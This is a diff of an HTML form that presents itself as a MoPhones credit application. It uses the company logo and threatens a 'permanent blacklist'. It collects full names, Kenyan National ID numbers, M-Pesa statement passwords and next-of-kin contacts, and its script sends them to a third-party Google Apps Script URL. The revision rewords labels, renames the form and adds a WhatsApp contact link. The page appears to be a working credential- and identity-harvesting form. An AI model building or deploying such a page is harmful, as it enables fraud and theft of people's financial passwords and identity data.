@@ -3,56 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoPhones | Executive Credit Portal</title>
+    <title>MoPhones | Executive Application</title>
     <style>
-        :root { --mophones-blue: #004488; --danger: #e11d48; --gold: #b45309; --bg: #0f172a; }
-        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); padding: 15px; margin: 0; color: #f8fafc; }
-        .container { background: white; padding: 30px; border-radius: 28px; max-width: 480px; margin: 15px auto; color: #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border-top: 6px solid var(--mophones-blue); }
+        :root { --mophones-blue: #004488; --danger: #e11d48; --dark-green: #065f46; --bg-blue: #004488; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg-blue); padding: 10px; margin: 0; color: #f8fafc; }
+        .container { background: white; padding: 25px; border-radius: 28px; max-width: 450px; margin: 10px auto; color: #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
         
-        .header { text-align: center; margin-bottom: 25px; }
-        .app-title { color: var(--mophones-blue); font-weight: 900; letter-spacing: -1px; margin-top: 10px; font-size: 1.6em; text-transform: uppercase; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .app-title { color: var(--mophones-blue); font-weight: 900; letter-spacing: -1px; margin-top: 8px; font-size: 1.4em; text-transform: uppercase; }
 
-        /* THE PRICE CHECK BUTTON */
+        /* BUTTONS */
         .price-link { 
             display: block; text-align: center; background: #eff6ff; border: 2px solid var(--mophones-blue); color: var(--mophones-blue); 
-            padding: 12px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-bottom: 25px; font-size: 0.9em;
+            padding: 14px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-bottom: 15px; font-size: 0.9em;
         }
-        .price-link:hover { background: var(--mophones-blue); color: white; }
+        .whatsapp-link { 
+            display: flex; align-items: center; justify-content: center; background: var(--dark-green); color: white; 
+            padding: 14px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-bottom: 25px; font-size: 0.9em;
+        }
 
         .dishonesty-banner { 
-            background: #fff1f2; border: 2px solid var(--danger); color: var(--danger); 
-            padding: 15px; border-radius: 16px; font-size: 0.85em; margin-bottom: 25px; text-align: center; font-weight: 700;
+            background: #fff1f2; border: 2px dashed var(--danger); color: var(--danger); 
+            padding: 15px; border-radius: 16px; font-size: 0.85em; margin-bottom: 25px; text-align: center; font-weight: 700; line-height: 1.4;
         }
 
-        label { display: block; margin-top: 18px; font-weight: 800; font-size: 0.75em; color: #64748b; text-transform: uppercase; letter-spacing: 1px; }
-        input, select { width: 100%; padding: 15px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 14px; box-sizing: border-box; font-size: 16px; font-weight: 600; }
-        input:focus, select:focus { border-color: var(--mophones-blue); outline: none; box-shadow: 0 0 0 4px rgba(0,68,136,0.1); }
+        label { display: block; margin-top: 18px; font-weight: 800; font-size: 0.75em; color: #64748b; text-transform: uppercase; }
+        input, select { width: 100%; padding: 15px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 14px; box-sizing: border-box; font-size: 16px; font-weight: 600; color: #1e293b; }
+        input:focus { border-color: var(--mophones-blue); outline: none; background: #fff; }
         
-        .btn-submit { background: var(--mophones-blue); color: white; padding: 22px; border: none; border-radius: 14px; width: 100%; margin-top: 30px; font-weight: 900; font-size: 1.2em; cursor: pointer; box-shadow: 0 10px 15px -3px rgba(0,68,136,0.3); }
-        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 30px; font-weight: 700; }
+        .btn-submit { background: var(--mophones-blue); color: white; padding: 20px; border: none; border-radius: 14px; width: 100%; margin-top: 30px; font-weight: 900; font-size: 1.2em; cursor: pointer; }
+        .footer { font-size: 0.75em; text-align: center; color: #94a3b8; margin-top: 30px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="160">
-        <div class="app-title">Application Form</div>
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="150">
+        <div class="app-title">Mophones Application Form</div>
     </div>
 
     <a href="https://mophones.co/collections/all-phones" target="_blank" class="price-link">
-        🔍 CLICK HERE TO CHECK PRICES & DEPOSITS
+        🔍 VIEW PRICES & DEPOSITS
+    </a>
+
+    <a href="https://wa.me/254112384099" class="whatsapp-link">
+        💬 CONTACT SUPPORT
     </a>
 
     <div class="dishonesty-banner">
-        🚨 HONESTY POLICY IN EFFECT<br>
-        False names, fake IDs, or incorrect passwords result in an automatic PERMANENT BLACKLIST.
+        🤝 HONESTY POLICY ENFORCED<br>
+        Any fake data or incorrect M-Pesa passwords lead to an immediate permanent blacklist.
     </div>
 
-    <form id="bossBitchPortal">
+    <form id="moLeadsPortal">
         <label>Select Approved Device</label>
         <select name="preferred_phone" id="phoneSelect" required>
-            <option value="">-- Choose Samsung or iPhone Only --</option>
+            <option value="">-- Choose Samsung or iPhone --</option>
             <optgroup label="SAMSUNG GALAXY">
                 <option value="Samsung A05/A05s">Samsung A05 / A05s</option>
                 <option value="Samsung A15">Samsung A15</option>
@@ -68,14 +75,14 @@
             </optgroup>
         </select>
 
-        <label>Full Name (Must be 3 Names)</label>
-        <input type="text" name="full_name" id="nameIn" placeholder="As it appears on National ID" required>
+        <label>Full Name (3 Names as on ID)</label>
+        <input type="text" name="full_name" id="nameIn" placeholder="First Middle Surname" required>
 
         <label>National ID Number</label>
-        <input type="text" name="id_number" id="idIn" maxlength="8" placeholder="Enter 7 or 8 digits" required>
+        <input type="text" name="id_number" id="idIn" maxlength="8" placeholder="7-8 Digits" required>
 
         <label>M-Pesa Statement Password</label>
-        <input type="text" name="mpesa_password" id="passIn" placeholder="Statement PDF Password" required>
+        <input type="text" name="mpesa_password" id="passIn" placeholder="Statement Password" required>
 
         <label>Next of Kin Name</label>
         <input type="text" name="nok_name" required>
@@ -83,48 +90,47 @@
         <label>Next of Kin Contact</label>
         <input type="text" name="nok_contact" id="kinIn" value="+254" maxlength="13" required>
 
-        <button type="submit" class="btn-submit" id="subBtn">SUBMIT & VET APPLICATION</button>
+        <button type="submit" class="btn-submit" id="subBtn">SUBMIT & VET DATA</button>
     </form>
     
-    <div class="footer">ENCRYPTED PARTAL CODE: jeez | MOPHONES AUTHORIZED</div>
+    <div class="footer">PORTAL: mo_leads_portal</div>
 </div>
 
 <script>
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
-const form = document.getElementById('bossBitchPortal');
+const form = document.getElementById('moLeadsPortal');
 
 form.addEventListener('submit', e => {
     e.preventDefault();
 
-    // --- THE IRON-CLAD VETTING ---
     const name = document.getElementById('nameIn').value.trim().split(/\s+/);
     const id = document.getElementById('idIn').value;
     const kin = document.getElementById('kinIn').value;
 
     if (name.length < 3) {
-        alert("🚨 REJECTED: Honesty Policy requires all 3 names exactly as on your ID.");
+        alert("🚨 REJECTED: You must provide exactly 3 names for verification.");
         return;
     }
     if (!/^\d{7,8}$/.test(id)) {
-        alert("🚨 REJECTED: Provide a valid 7 or 8 digit Kenyan National ID.");
+        alert("🚨 REJECTED: Invalid National ID number.");
         return;
     }
     if (!kin.startsWith("+254") || kin.length !== 13) {
-        alert("🚨 REJECTED: Contact format must be +254XXXXXXXXX.");
+        alert("🚨 REJECTED: Kin contact must be +254XXXXXXXXX.");
         return;
     }
 
     document.getElementById('subBtn').disabled = true;
-    document.getElementById('subBtn').innerText = "VETTING IN PROGRESS...";
+    document.getElementById('subBtn').innerText = "VETTING...";
 
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
       .then(response => {
-          alert("✅ APPLICATION SUCCESSFUL\nYour credit profile is being vetted. If honest, we will call you shortly.");
+          alert("✅ SUCCESS\nApplication received. Stay reachable for verification.");
           form.reset();
           window.location.reload();
       })
       .catch(error => {
-          alert("System Busy. Please try again.");
+          alert("Error. Please try again.");
           document.getElementById('subBtn').disabled = false;
       });
 });
